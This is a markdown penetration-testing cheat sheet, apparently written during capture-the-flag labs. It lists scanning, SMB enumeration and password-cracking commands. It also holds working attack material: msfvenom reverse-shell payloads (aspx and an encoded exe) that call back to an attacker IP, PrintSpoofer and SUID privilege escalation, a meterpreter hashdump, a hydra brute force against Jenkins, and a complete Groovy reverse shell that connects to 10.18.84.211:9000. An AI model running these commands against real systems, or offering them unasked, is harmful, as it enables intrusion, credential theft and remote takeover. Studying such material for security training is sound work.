## basic gobuster
```bash
gobuster dir -u http://10.10.145.21 -w /usr/share/wordlists/dirb/common.txt -e -o scans/gobuster.common
```

## basic
```bash
nmap -sV 10.10.240.21 -o scans/nmap.initial
```

## all ports 
```bash
nmap -sV -p- -T5 10.10.145.21 -o scans/nmap.all
```

## view smb shares
```bash
smbclient -L 10.10.145.21
```
## connect to specific file share
```bash
smbclient \\\\10.10.145.21\\nt4wrksv
```

## aspx reverse shell msfvenom
catch with netcat
```bash
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=10.18.84.211 LPORT=9000 -o pown.aspx
```
## printspoofer
https://github.com/dievus/printspoofer
windows privilage escalation

```bash
PrintSpoofer.exe -i -c cmd
```
## search for wordpress users
```bash
wpscan --url 10.10.240.21/blog -e vp,u
```

## php reverse shell 
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O rshell.php
```

## spawn shell in python

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```


## find SUID files
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

## exploit systemctl SUID 
GTFOBINS
https://gtfobins.github.io/gtfobins/systemctl/

## eternal blue
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

## shell to meterpreter session
post/multi/manage/shell_to_meterpreter

set session and run
creates a new background session with meterpreter

## hasdump
run 
```bash
hashdump
``` 
in meterpreter session to dump hashes

## cracking with john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

## enumerate samba shares with nmap
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.137.253
```

## download files from samba shares
```bash
smbclient //<ip>/anonymous
```

## enumerate rpcbind with nmap
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.137.253
```

## load powershell in meterpreter session

```bash
load powershell
```
```bash
powershell_shell
```
## msfvenom reverse shell .exe
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.84.211 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

## wpscan 
```bash
wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

## ssh port forward
host service from ssh network running on 172.17.0.2:8080 on localhost:8080
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

## hydra jenkins
```bash
hydra -s 8080 localhost http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30
```

## jenkins reverse shell 
```bash
String host="10.18.84.211";
int port=9000;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## stabilize shell with xterm 
```bash
export TERM=xterm
```


